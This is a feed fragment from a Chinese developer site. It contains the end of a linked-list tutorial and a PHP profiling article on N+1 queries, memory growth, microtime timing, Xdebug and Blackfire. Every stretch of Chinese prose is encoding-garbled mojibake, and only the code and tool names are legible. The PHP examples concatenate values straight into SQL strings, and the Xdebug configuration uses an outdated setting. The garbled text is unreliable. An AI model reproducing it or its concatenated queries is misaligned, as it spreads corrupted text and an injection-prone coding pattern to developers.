<p>é¿å‘åŸåˆ™ï¼šå…ˆæ ¡éªŒè¾¹ç•Œï¼Œå†æ‰§è¡Œæ ¸å¿ƒé€»è¾‘ï¼ŒæŒ‡é’ˆæ“ä½œâ€œå…ˆè¿åæ–­â€ã€‚</p>
</li>
</ul>
<h4 data-id="heading-20">2. åŒé“¾è¡¨æ ¸å¿ƒ</h4>
<ul>
<li>
<p>æ ¸å¿ƒå‡çº§ï¼šèŠ‚ç‚¹æ–°å¢<code>prev</code>æŒ‡é’ˆï¼Œæ–°å¢<code>dummyTail</code>ï¼ˆè™šæ‹Ÿå°¾ï¼‰ï¼›</p>
</li>
<li>
<p>æ•ˆç‡ä¼˜åŠ¿ï¼šåˆ é™¤èŠ‚ç‚¹æ— éœ€æ‰¾å‰é©±ï¼Œæ”¯æŒåŒå‘éå†ï¼›</p>
</li>
<li>
<p>æ“ä½œåŸåˆ™ï¼š<code>prev/next</code>æˆå¯¹æ›´æ–°ï¼Œéå†æ–¹å‘æŒ‰éœ€é€‰æ‹©ã€‚</p>
</li>
</ul>
<p>æŒæ¡å•é“¾è¡¨å’ŒåŒé“¾è¡¨çš„å®ç°é€»è¾‘åï¼Œä¸ä»…èƒ½åº”å¯¹é“¾è¡¨ç­‰åŸºç¡€é¢˜ï¼Œè¿˜èƒ½æ‰©å±•åˆ°ç¯å½¢é“¾è¡¨ã€LRUç¼“å­˜ï¼ˆåŒé“¾è¡¨+å“ˆå¸Œè¡¨ï¼‰ç­‰è¿›é˜¶åœºæ™¯ã€‚å»ºè®®ç»“åˆæµ‹è¯•ç”¨ä¾‹åå¤è°ƒè¯•ï¼Œé‡ç‚¹å…³æ³¨æŒ‡é’ˆæ“ä½œå’ŒçŠ¶æ€åŒæ­¥ï¼Œå½¢æˆè‚Œè‚‰è®°å¿†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§]]></title>    <link>https://juejin.cn/post/7596906923892817930</link>    <guid>https://juejin.cn/post/7596906923892817930</guid>    <pubDate>2026-01-19T23:44:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892817930" data-draft-id="7596904122866057267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§"/> <meta itemprop="keywords" content="åç«¯,PHP"/> <meta itemprop="datePublished" content="2026-01-19T23:44:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:44:14.000Z" title="Mon Jan 19 2026 23:44:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§</h2>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆ PHP åº”ç”¨éœ€è¦æ€§èƒ½åˆ†æ</h3>
<p>ä½œä¸º PHP å¼€å‘è€…ï¼Œä½ ç»å¸¸è¦æ„å»ºå¯æ‰©å±•ã€èƒ½æ”¯æ’‘é«˜å¹¶å‘ã€æ€§èƒ½ç¨³å®šçš„åº”ç”¨ã€‚ä½†å½“ç³»ç»Ÿå¤æ‚åº¦æˆ–æµé‡ä¸Šæ¥åï¼Œæ€§èƒ½ç“¶é¢ˆå°±ä¼šå‡ºç°ï¼Œè€Œä¸”è¿™äº›é—®é¢˜åœ¨å¼€å‘ç”šè‡³æµ‹è¯•é˜¶æ®µå¾€å¾€çœ‹ä¸åˆ°ã€‚</p>
<p>æ€§èƒ½åˆ†æï¼ˆprofilingï¼‰èƒ½è®©ä½ ä»çŒœæµ‹å›åˆ°æ•°æ®ã€‚å®ƒå¸®ä½ è¡¡é‡åº”ç”¨å„ä¸ªç¯èŠ‚çš„æ€§èƒ½ï¼Œç²¾å‡†æ‰¾å‡ºä½æ•ˆç‚¹ã€‚ä¸å…¶å‡­æ„Ÿè§‰ä¼˜åŒ–ï¼Œä¸å¦‚ç›´æ¥çœ‹æ•°æ®å‘Šè¯‰ä½ å“ªé‡Œæ…¢â€”â€”æ•°æ®åº“æŸ¥è¯¢ã€å†…å­˜å ç”¨è¿˜æ˜¯å‡½æ•°è°ƒç”¨ã€‚</p>
<p>æœ¬æ–‡ä¼šä»‹ç»å¦‚ä½•å¯¹ PHP åº”ç”¨åšæ€§èƒ½åˆ†æã€å¸¸è§æ€§èƒ½é—®é¢˜ã€é€‚ç”¨å·¥å…·ï¼Œä»¥åŠå¦‚ä½•ä¸ºä¿®å¤æ’ä¼˜å…ˆçº§ã€‚
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fprofiling-php-applications-from-assumptions-to-data" target="_blank" title="https://catchadmin.com/post/2026-01/profiling-php-applications-from-assumptions-to-data" ref="nofollow noopener noreferrer">åŸæ–‡ PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§</a></p>
<h3 data-id="heading-2">æ€§èƒ½åˆ†æåŸºç¡€ï¼šä½ éœ€è¦çŸ¥é“ä»€ä¹ˆ</h3>
<p>æ€§èƒ½åˆ†æçš„æ ¸å¿ƒæ˜¯æµ‹é‡ä¸åˆ†æåº”ç”¨çš„èµ„æºæ¶ˆè€—ï¼Œä¾‹å¦‚ CPUã€å†…å­˜å’Œæ‰§è¡Œæ—¶é—´ï¼Œå¸®åŠ©ä½ æ‰¾å‡ºçœŸæ­£éœ€è¦ä¼˜åŒ–çš„â€œçƒ­åŒºâ€ã€‚</p>
<p>æ€§èƒ½åˆ†ææ•°æ®é€šå¸¸èƒ½å›ç­”è¿™äº›é—®é¢˜ï¼š</p>
<ul>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­ç”¨äº†å¤šå°‘å†…å­˜ï¼Ÿ</li>
<li><strong>æ‰§è¡Œæ—¶é—´</strong>ï¼šå“ªäº›å‡½æ•°æˆ–æ¨¡å—è€—æ—¶æœ€é•¿ï¼Ÿ</li>
<li><strong>æ•°æ®åº“æŸ¥è¯¢æ€§èƒ½</strong>ï¼šå“ªäº›æŸ¥è¯¢æœ€æ…¢ï¼Ÿæ€»å…±æ‰§è¡Œäº†å¤šå°‘æ¬¡ï¼Ÿ</li>
<li><strong>CPU ä½¿ç”¨</strong>ï¼šå“ªäº›å‡½æ•°æ¶ˆè€—äº†æœ€å¤š CPU è®¡ç®—ï¼Ÿ</li>
</ul>
<p>é€šè¿‡è¿™äº›æŒ‡æ ‡ï¼Œä½ å°±èƒ½ç²¾å‡†å®šä½æ€§èƒ½é—®é¢˜å¹¶ä¼˜åŒ–ä»£ç ã€‚</p>
<h3 data-id="heading-3">PHP åº”ç”¨å¸¸è§æ€§èƒ½é—®é¢˜</h3>
<p>åšæ€§èƒ½åˆ†ææ—¶ï¼Œä¸‹é¢è¿™äº›é—®é¢˜æœ€å¸¸å‡ºç°ã€‚</p>
<h4 data-id="heading-4">è¿‡å¤šçš„æ•°æ®åº“æŸ¥è¯¢</h4>
<p>å¦‚æœåº”ç”¨é¢‘ç¹ä¸æ•°æ®åº“äº¤äº’ï¼Œå“åº”å°±å¯èƒ½å˜æ…¢ï¼Œå¸¸è§åŸå› åŒ…æ‹¬ï¼š</p>
<ul>
<li>æŸ¥è¯¢å†™å¾—ä½æ•ˆï¼ˆå–äº†è¿‡å¤šæ•°æ®ã€ç¼ºå°‘ç´¢å¼•ï¼‰</li>
<li>åœ¨å¾ªç¯é‡Œæ‰§è¡ŒæŸ¥è¯¢ï¼Œå‡ºç° N+1 é—®é¢˜</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$posts</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM posts"</span>);
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$posts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post</span>) {
    <span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id = "</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">'id'</span>]);
    <span class="hljs-comment">// display posts and comments</span>
}
</code></pre>
<p>å¦‚æœæœ‰ 100 ç¯‡æ–‡ç« ï¼Œè¿™æ®µä»£ç ä¼šè·‘ 101 æ¬¡æŸ¥è¯¢ï¼ˆ1 æ¬¡å–æ–‡ç«  + 100 æ¬¡å–è¯„è®ºï¼‰ï¼Œæ•ˆç‡å¾ˆä½ã€‚</p>
<h4 data-id="heading-5">ä½æ•ˆçš„å¾ªç¯</h4>
<p>æœ‰äº›ä»£ç åœ¨å¤§æ•°æ®é›†ä¸Šä½¿ç”¨åµŒå¥—å¾ªç¯æˆ–æ˜‚è´µæ“ä½œï¼Œæ‰§è¡Œæ—¶é—´ä¼šè¢«æ”¾å¤§ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
    <span class="hljs-comment">// Performing some heavy operation</span>
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">complexOperation</span>(<span class="hljs-variable">$item</span>);
}
</code></pre>
<p>Profiling èƒ½å¸®ä½ è¯†åˆ«è¿™äº›å¾ªç¯å¹¶è¡¡é‡è€—æ—¶ï¼Œç»™ä½ ä¼˜åŒ–çš„æŠ“æ‰‹ã€‚</p>
<h4 data-id="heading-6">å†…å­˜æ³„æ¼</h4>
<p>å†…å­˜æ³„æ¼æŒ‡å¯¹è±¡æˆ–å˜é‡å ç”¨è¿‡å¤šå†…å­˜ä¸”æ— æ³•åŠæ—¶é‡Šæ”¾ã€‚æ•°æ®é‡å¤§æ—¶ï¼Œå†…å­˜ä¼šæŒç»­å¢é•¿ï¼Œå¯¼è‡´æ€§èƒ½ä¸‹é™ç”šè‡³å´©æºƒã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) {
    <span class="hljs-variable">$rows</span>[] = <span class="hljs-variable">$row</span>;
}
</code></pre>
<p>å¦‚æœ <code>$rows</code> æ— é™å¢é•¿ï¼Œå°±å¯èƒ½è€—å°½å†…å­˜ã€‚Profiling èƒ½å¸®åŠ©ä½ è¯†åˆ«å¹¶ä¼˜åŒ–è¿™ç±»é—®é¢˜ã€‚</p>
<h4 data-id="heading-7">ç¼“å­˜ç­–ç•¥ä¸ä½³</h4>
<p>ç¼“å­˜æ˜¯æé€Ÿçš„åˆ©å™¨ï¼Œä½†ç­–ç•¥ä¸å½“ä¹Ÿä¼šæ‹–æ…¢ç³»ç»Ÿï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>æ²¡æœ‰ç¼“å­˜æ•°æ®ï¼ˆæ¯æ¬¡éƒ½ä»æ•°æ®åº“é‡æ–°æŸ¥è¯¢ï¼‰</li>
<li>ç¼“å­˜å¤±æ•ˆç­–ç•¥æ··ä¹±</li>
</ul>
<h3 data-id="heading-8">PHP åº”ç”¨æ€§èƒ½åˆ†æçš„æ–¹æ³•</h3>
<p>ä¸‹é¢æ˜¯å‡ ç§å¸¸è§ä¸”å®ç”¨çš„æ€§èƒ½åˆ†ææ–¹æ³•ä¸å·¥å…·ã€‚</p>
<h4 data-id="heading-9">ä½¿ç”¨ microtime() æ‰‹åŠ¨æ€§èƒ½åˆ†æ</h4>
<p>å¯¹äºå°èŒƒå›´æ€§èƒ½æµ‹è¯•ï¼Œå¯ä»¥ç”¨ PHP å†…ç½®çš„ <code>microtime()</code> è®°å½•æ‰§è¡Œæ—¶é—´ã€‚</p>
<p>ç¤ºä¾‹ï¼šä½¿ç”¨ microtime() è¿›è¡ŒåŸºç¡€æ€§èƒ½åˆ†æ</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$start_time</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);
<span class="hljs-comment">// Simulating some code execution</span>
<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// Sleep for 2 seconds</span>
<span class="hljs-variable">$end_time</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);
<span class="hljs-variable">$execution_time</span> = <span class="hljs-variable">$end_time</span> - <span class="hljs-variable">$start_time</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"Execution time: "</span> . <span class="hljs-variable">$execution_time</span> . <span class="hljs-string">" seconds"</span>;
</code></pre>
<p>è¿™ç§æ–¹æ³•ç®€å•ï¼Œä½†ä¸é€‚åˆå¤æ‚åº”ç”¨ï¼Œæ›´é€‚åˆå°ç‰‡æ®µæ€§èƒ½æ£€æŸ¥ã€‚</p>
<h4 data-id="heading-10">Xdebugï¼šå¼ºå¤§çš„æ€§èƒ½åˆ†æå·¥å…·</h4>
<p>Xdebug æ˜¯æœ€å¸¸ç”¨çš„ PHP profiling å·¥å…·ä¹‹ä¸€ï¼Œå¯è·Ÿè¸ªå‡½æ•°è°ƒç”¨ã€å†…å­˜å ç”¨å’Œæ‰§è¡Œæ—¶é—´ã€‚å®ƒä¼šç”Ÿæˆ cachegrind æ–‡ä»¶ï¼Œå¹¶å¯ç”¨ KCacheGrind æˆ– QCacheGrind å¯è§†åŒ–åˆ†æã€‚</p>
<p>é…ç½® Xdebug æ€§èƒ½åˆ†æï¼š</p>
<ol>
<li>å®‰è£… Xdebugã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get install php-xdebug
</code></pre>
<ol start="2">
<li>åœ¨ <code>php.ini</code> ä¸­å¼€å¯ profilingï¼š</li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">xdebug.profiler_enable</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">xdebug.profiler_output_dir</span> = <span class="hljs-string">"/var/tmp/xdebug_profiles"</span>
</code></pre>
<ol start="3">
<li>è¿è¡Œåº”ç”¨ï¼Œç”Ÿæˆ cachegrind æ–‡ä»¶ã€‚</li>
<li>ç”¨ KCacheGrind æˆ– QCacheGrind å¯è§†åŒ–åˆ†æã€‚</li>
</ol>
<p>ç¤ºä¾‹ï¼šXdebug æ€§èƒ½åˆ†æè¾“å‡º</p>
<pre><code class="hljs language-text" lang="text">Function Name     Calls  Time   Memory
--------------------------------------
myFunction()       10    0.005  512KB
databaseQuery()    15    0.020  1MB
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œ<code>databaseQuery()</code> è€—æ—¶æ›´é«˜ï¼Œè¯´æ˜æ•°æ®åº“å±‚å¯èƒ½éœ€è¦è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚</p>
<h4 data-id="heading-11">Blackfireï¼šç°ä»£åŒ–æ€§èƒ½åˆ†ææ–¹æ¡ˆ</h4>
<p>Blackfire æ›´ç°ä»£ã€ä½“éªŒå‹å¥½ï¼Œæä¾›ç«ç„°å›¾ï¼ˆflame graphï¼‰ï¼Œèƒ½ç›´è§‚çœ‹åˆ° CPU å’Œå†…å­˜è€—æ—¶ã€‚</p>
<p>Blackfire çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>è‡ªåŠ¨æ€§èƒ½åˆ†æï¼šæ¯æ¬¡ HTTP è¯·æ±‚éƒ½å¯è‡ªåŠ¨åˆ†æ</li>
<li>å¯¹æ¯”åˆ†æï¼šæ”¯æŒå¯¹æ¯”ä¼˜åŒ–å‰åçš„æ€§èƒ½</li>
<li>ç«ç„°å›¾ï¼ˆflame graphï¼‰ï¼šå¯è§†åŒ– CPU ä¸å†…å­˜æ¶ˆè€—</li>
</ul>
<p>ä½¿ç”¨ Blackfireï¼š</p>
<ol>
<li>åœ¨ Blackfire.io æ³¨å†Œå¹¶å®‰è£… Blackfire Agent ä¸ Profilerã€‚</li>
<li>åœ¨åº”ç”¨é‡Œå¯ç”¨æ€§èƒ½åˆ†æï¼š</li>
</ol>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title class_">Blackfire\Profiler</span>::<span class="hljs-title function_ invoke__">enable</span>();
</code></pre>
<ol start="3">
<li>æ‰§è¡Œæ€§èƒ½åˆ†æåï¼ŒæŠ¥å‘Šä¸­ä¼šä»¥ç«ç„°å›¾å±•ç¤ºä»£ç è€—æ—¶åˆ†å¸ƒã€‚</li>
</ol>
<h3 data-id="heading-12">è§£ææ€§èƒ½åˆ†ææ•°æ®ï¼šæŠŠæ´å¯Ÿå˜æˆè¡ŒåŠ¨</h3>
<p>æ‹¿åˆ°æ€§èƒ½åˆ†ææ•°æ®åï¼Œå…³é”®æ˜¯åˆ¤æ–­å“ªäº›åœ°æ–¹è€—èµ„æºæœ€å¤šï¼Œå†å†³å®šä¼˜åŒ–ä¼˜å…ˆçº§ã€‚</p>
<h4 data-id="heading-13">æ…¢å‡½æ•°</h4>
<p>ä¼˜å…ˆæ‰¾æ‰§è¡Œæ—¶é—´é•¿çš„å‡½æ•°ã€‚é€šå¸¸æ˜¯å¤šåšäº†ä¸å¿…è¦çš„è®¡ç®—ï¼Œæˆ–å¤„ç†äº†è¿‡å¤šæ•°æ®ã€‚</p>
<h4 data-id="heading-14">å†…å­˜å ç”¨</h4>
<p>å¦‚æœè„šæœ¬åƒå†…å­˜è¿‡å¤šï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¤§å¯¹è±¡æˆ–æ•°ç»„é•¿æœŸä¿ç•™ã€‚å¯ä»¥è€ƒè™‘é‡Šæ”¾å†…å­˜æˆ–æ”¹æˆæµå¼å¤„ç†ã€‚</p>
<h4 data-id="heading-15">ä½æ•ˆçš„æ•°æ®åº“æŸ¥è¯¢</h4>
<p>æ…¢æŸ¥è¯¢é€šå¸¸æ˜¯æ€§èƒ½çš„æœ€å¤§ç“¶é¢ˆã€‚å¯è€ƒè™‘åŠ ç´¢å¼•ã€ç¼“å­˜ï¼Œæˆ–é‡å†™æŸ¥è¯¢é€»è¾‘ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// Inefficient:</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$posts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post</span>) {
    <span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id = "</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">'id'</span>]);
}
<span class="hljs-comment">// Optimized:</span>
<span class="hljs-variable">$post_ids</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">','</span>, <span class="hljs-title function_ invoke__">array_column</span>(<span class="hljs-variable">$posts</span>, <span class="hljs-string">'id'</span>));
<span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id IN (<span class="hljs-subst">$post_ids</span>)"</span>);
</code></pre>
<p>è¿™ç§æ”¹å†™æŠŠå¤šæ¬¡æŸ¥è¯¢å˜æˆä¸€æ¬¡æŸ¥è¯¢ï¼Œæ€§èƒ½æ˜æ˜¾æ›´å¥½ã€‚</p>
<h3 data-id="heading-16">ä¿®å¤ä¼˜å…ˆçº§ï¼šå…ˆä»å“ªé‡Œä¸‹æ‰‹</h3>
<p>æ‹¿åˆ°æ•°æ®åï¼Œåº”è¯¥ä¼˜å…ˆå¤„ç†æ”¶ç›Šæœ€å¤§çš„åœ°æ–¹ï¼š</p>
<ul>
<li><strong>ç”¨æˆ·ä½“éªŒä¼˜å…ˆ</strong>ï¼šç›´æ¥å½±å“é¡µé¢å“åº”çš„æ…¢ç‚¹å¿…é¡»å…ˆè§£å†³ã€‚</li>
<li><strong>ä¿®å¤æˆæœ¬</strong>ï¼šå¤§è§„æ¨¡é‡æ„è¦è¡¡é‡æŠ•å…¥äº§å‡ºï¼Œå…ˆåšå°æ”¹åŠ¨çš„é«˜æ”¶ç›Šä¼˜åŒ–ã€‚</li>
<li><strong>é«˜å½±å“åŒºåŸŸ</strong>ï¼šæ•°æ®åº“æŸ¥è¯¢ã€å†…å­˜å ç”¨å’Œ CPU å¯†é›†çš„å‡½æ•°å¾€å¾€æœ€å€¼å¾—å…ˆåŠ¨æ‰‹ã€‚</li>
</ul>
<p>æ¯”å¦‚ï¼Œå¦‚æœé¢‘ç¹è°ƒç”¨çš„å‡½æ•°å­˜åœ¨å†…å­˜æ³„æ¼ï¼Œä¿®å¤å®ƒä¼šåœ¨é«˜å¹¶å‘ä¸‹å¸¦æ¥æ˜¾è‘—æ”¶ç›Šã€‚</p>
<h3 data-id="heading-17">ç»“è¯­ï¼šæ€§èƒ½åˆ†æå¯¹ PHP æ€§èƒ½ä¼˜åŒ–çš„ä»·å€¼</h3>
<p>æ€§èƒ½åˆ†æè®©æ€§èƒ½ä¼˜åŒ–æœ‰æ•°æ®æ”¯æ’‘ã€‚ä½ ä¸å†é ç›´è§‰æ‰¾ç“¶é¢ˆï¼Œè€Œæ˜¯é€šè¿‡é‡åŒ–ç»“æœå‡†ç¡®å®šä½é—®é¢˜ã€‚æ— è®ºæ˜¯ <code>microtime()</code>ã€Xdebug è¿˜æ˜¯ Blackfireï¼Œæ€§èƒ½åˆ†æéƒ½èƒ½ç»™ä½ è¶³å¤Ÿçš„æ´å¯Ÿæ¥åšå‡ºæœ‰æ•ˆä¼˜åŒ–ã€‚</p>
